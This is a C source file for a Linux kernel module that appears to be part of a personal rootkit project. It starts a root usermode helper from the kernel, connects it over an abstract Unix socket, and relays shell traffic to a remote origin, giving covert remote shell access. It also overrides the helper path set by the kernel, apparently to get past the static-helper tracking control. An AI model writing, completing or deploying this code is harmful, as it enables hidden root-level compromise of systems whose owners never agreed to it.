#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/umh.h>
#include <linux/pipe_fs_i.h>
#include <linux/file.h>
#include <linux/un.h>
#include <net/net_namespace.h>
#include <net/sock.h>

#include "headers/networking.h"
#include "headers/shell.h"

#define SOCK_PATH ("\0test-file2")
#define USERMODE_HELPER_PATH ("/home/yanayg/MyRootkit/usermode/client")
#define SOCK_PATH_LEN (sizeof(SOCK_PATH))
#define SOCK_DEV_MTU (2048)
#define DELAY_JIFFIES (2)

// According to the following post
// https://stackoverflow.com/questions/19937598/linux-kernel-module-unix-domain-sockets
// There is a bug with the kernel that incorrectly sets a byte after the struct sockaddr_un
// which can corrupt memory, so this struct should be safe against it.
struct safe_sockaddr_un {
    struct sockaddr_un addr;
    char padding[1];
};

struct stream_data {
    struct socket *sock;
    struct delayed_work work;
    struct open_stream *st;
};

static int job_t_to_str(char *buffer, int len, job_id_t job_id) {
    int i;
    for (i = 0; i < len; i++) {
        buffer[len - i - 1] = '0' + job_id % 10;
        job_id /= 10;
    }
    return job_id;
}

static int start_usermode_shell(job_id_t job_id) {
    int err;
    struct subprocess_info *info;
    char sock_path[6];
    char *argv[] = { USERMODE_HELPER_PATH, sock_path, NULL };
    static char *envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
		NULL
	};

    // strcpy(sock_path, SOCK_PATH);
    job_t_to_str(sock_path, 6, job_id);
    // printk("%s\n" KERN_INFO, sock_path);

    info = call_usermodehelper_setup(
        USERMODE_HELPER_PATH, 
        argv, 
        envp,
        GFP_KERNEL,
        NULL, 
        NULL, 
        NULL
    );

    // This value can be overriden in `call_usermodehelper_setup` by setting CONFIG_STATIC_USERMODEHELPER_PATH,
    // this means the helpers can be tracked or disabled.
    info->path = USERMODE_HELPER_PATH;

    if ((err =  call_usermodehelper_exec(info, UMH_KILLABLE))) {
        return err;
    }
    return 0;
}

static void poll_shell_work(struct work_struct *work) {
    struct stream_data *data = container_of(to_delayed_work(work), struct stream_data, work);
    struct msghdr msg;
    char *buff;
    int res;
    struct kvec iov = {
        .iov_len = SOCK_DEV_MTU
    };

    buff = kmalloc(SOCK_DEV_MTU, GFP_KERNEL);
    if (!buff) goto done;

    iov.iov_base = buff;

    res = kernel_recvmsg(data->sock, &msg, &iov, 1, SOCK_DEV_MTU, MSG_DONTWAIT);
    if (res == 0) {
        printk("Unix sock disconnected\n");
        close_stream(data->st);
        printk("closed stream\n");
        return;
    } else if (res > 0) {
        res = send_response(data->st->origin, buff, res);
        if (res) {
            printk("Error sending out - %d\n", res);
        }
    } else if (res != -11) {
        printk("Error receiving from unix sock - %d\n", res);
    }

done:  
    kfree(buff);
    schedule_delayed_work(&data->work, DELAY_JIFFIES);
}



int open_shell(struct open_stream *st) {
    struct socket *srvsock = NULL;
    struct safe_sockaddr_un saddr;
    struct stream_data *data;
    int res;

    data = kmalloc(sizeof(struct stream_data), GFP_KERNEL);

    if ((res = sock_create_kern(&init_net, AF_UNIX, SOCK_SEQPACKET, 0, &srvsock))) {
        goto data;
    }

    memset(&saddr, 0, sizeof(saddr));
    saddr.addr.sun_family = AF_UNIX;
    memcpy(saddr.addr.sun_path, SOCK_PATH,  min(SOCK_PATH_LEN, sizeof(saddr.addr.sun_path) - 1));
    
    if ((res = kernel_bind(srvsock, (struct sockaddr *)&saddr.addr, sizeof(saddr.addr)))) {
        printk(KERN_INFO "Couldn't bind to addr\n");
        goto sock;
    }
    printk(KERN_INFO "Bound to addr\n");

    if ((res = kernel_listen(srvsock, 1))) {
        goto sock;
    }

    if ((res = start_usermode_shell(st->origin.job_id))) {
        goto sock;
    }

    res = kernel_accept(srvsock, &data->sock, 0);

    INIT_DELAYED_WORK(&data->work, poll_shell_work);
    st->data = data;
    data->st = st;

    schedule_delayed_work(&data->work, DELAY_JIFFIES);

    return 0;

sock:
    sock_release(srvsock);

data: 
    kfree(data);

    return res;
}

int recv_shell(struct open_stream *st, char *buff, size_t len) {
    int ret;
    struct socket *sock = ((struct stream_data *)st->data)->sock;
    struct msghdr msg = {
        .msg_name = NULL,
        .msg_control = NULL
    };
    struct kvec iov = {
        .iov_base = buff,
        .iov_len = len
    };

    if ((ret = kernel_sendmsg(sock, &msg, &iov, 1, len)) < 0) {
        return 1;
    }

    return 0;
}

int close_shell(struct open_stream *st) {
    if (st->data) {
        sock_release(((struct stream_data *)st->data)->sock);
    }
    kfree(st->data);
    return 0;
}
